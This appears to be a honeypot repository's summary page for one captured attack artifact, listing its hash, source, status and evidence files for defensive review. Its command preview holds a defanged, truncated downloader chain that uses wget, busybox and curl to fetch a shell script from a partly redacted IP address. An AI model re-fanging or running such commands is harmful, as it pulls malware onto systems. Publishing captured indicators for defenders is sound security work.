# a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `a84e3cc23877f5d8e92f8133eea8d7a2a6e62802e8a350945eb2c09d1fe68932` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
(wget -qO- hxxp://45[.]153[.]34[.]XXX/rondo.``dgx.sh||busybox wget -qO- hxxp://45[.]153[.]34[.]XXX/rondo.``dgx.sh||curl -s hxxp://45
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
